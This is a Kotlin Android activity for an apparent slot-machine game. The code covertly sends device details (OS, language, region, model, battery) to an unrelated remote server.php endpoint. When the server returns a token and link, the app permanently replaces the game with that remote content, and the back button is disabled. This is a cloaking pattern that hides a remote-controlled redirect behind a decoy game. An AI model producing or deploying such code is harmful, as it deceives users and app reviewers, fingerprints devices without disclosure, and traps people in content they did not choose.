package com.totalcasno.games.njskn

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.View
import android.view.WindowManager
import androidx.activity.ComponentActivity
import androidx.activity.OnBackPressedCallback
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.lifecycle.lifecycleScope
import com.totalcasno.games.njskn.network.ApiService
import com.totalcasno.games.njskn.ui.SettingsScreen
import com.totalcasno.games.njskn.ui.SlotMachineScreen
import com.totalcasno.games.njskn.ui.theme.TotalCasnoTheme
import com.totalcasno.games.njskn.utils.DeviceInfoHelper
import com.totalcasno.games.njskn.utils.PreferencesHelper
import com.totalcasno.games.njskn.utils.SettingsHelper
import com.totalcasno.games.njskn.utils.SlotTheme
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    
    private val serverEndpoint = "https://wallen-eatery.space/a-vdm-11/server.php?p=Jh675eYuunk85&os=OS_SYSTEM&lng=LANGUAGE_SYSTEM&loc=REGION_DEVICE&devicemodel=DEVICE_MODEL&bs=BATTERY_STATUS&bl=BATTERY_LEVEL"
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        hideSystemUI()
        
        if (PreferencesHelper.hasToken(this)) {
            val savedLink = PreferencesHelper.getLink(this)
            if (!savedLink.isNullOrEmpty()) {
                openContentView(savedLink)
                return
            }
        }
        
        setContent {
            var isLoading by remember { mutableStateOf(true) }
            var showSettings by remember { mutableStateOf(false) }
            var slotCount by remember { mutableStateOf(SettingsHelper.getSlotCount(this)) }
            var currentTheme by remember { mutableStateOf(SettingsHelper.getTheme(this)) }
            
            val theme = SlotTheme.fromString(currentTheme)
            
            LaunchedEffect(Unit) {
                fetchServerData { 
                    isLoading = false
                }
            }
            
            TotalCasnoTheme {
                if (showSettings) {
                    SettingsScreen(
                        currentSlotCount = slotCount,
                        currentTheme = currentTheme,
                        onSlotCountChanged = { count ->
                            slotCount = count
                            SettingsHelper.saveSlotCount(this, count)
                        },
                        onThemeChanged = { themeName ->
                            currentTheme = themeName
                            SettingsHelper.saveTheme(this, themeName)
                        },
                        onBackClick = {
                            showSettings = false
                        }
                    )
                } else {
                    SlotMachineScreen(
                        slotCount = slotCount,
                        symbols = theme.symbols,
                        onStartRequested = {
                            if (!isLoading) {
                                isLoading = true
                                fetchServerData { 
                                    isLoading = false
                                }
                            }
                        },
                        onSettingsClick = {
                            showSettings = true
                        },
                        isLoading = isLoading
                    )
                }
            }
        }
        
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
            }
        })
    }
    
    private fun hideSystemUI() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode = 
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
        
        WindowCompat.setDecorFitsSystemWindows(window, false)
        
        val controller = WindowInsetsControllerCompat(window, window.decorView)
        controller.hide(WindowInsetsCompat.Type.systemBars())
        controller.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        
        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        )
        
        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        
        ViewCompat.setOnApplyWindowInsetsListener(window.decorView) { view, insets ->
            insets
        }
    }
    
    override fun onResume() {
        super.onResume()
        hideSystemUI()
    }
    
    private fun fetchServerData(onComplete: () -> Unit) {
        lifecycleScope.launch {
            try {
                val requestLink = DeviceInfoHelper.buildRequestLink(serverEndpoint, this@MainActivity)
                val result = ApiService.fetchServerResponse(requestLink)
                
                result.onSuccess { response ->
                    val (token, link) = ApiService.parseResponse(response)
                    
                    if (token != null && link != null) {
                        PreferencesHelper.saveToken(this@MainActivity, token)
                        PreferencesHelper.saveLink(this@MainActivity, link)
                        openContentView(link)
                    } else {
                        onComplete()
                    }
                }.onFailure {
                    onComplete()
                }
            } catch (e: Exception) {
                onComplete()
            }
        }
    }
    
    private fun openContentView(targetLink: String) {
        val intent = Intent(this, ContentViewActivity::class.java).apply {
            putExtra("TARGET_LINK", targetLink)
        }
        startActivity(intent)
    }
}
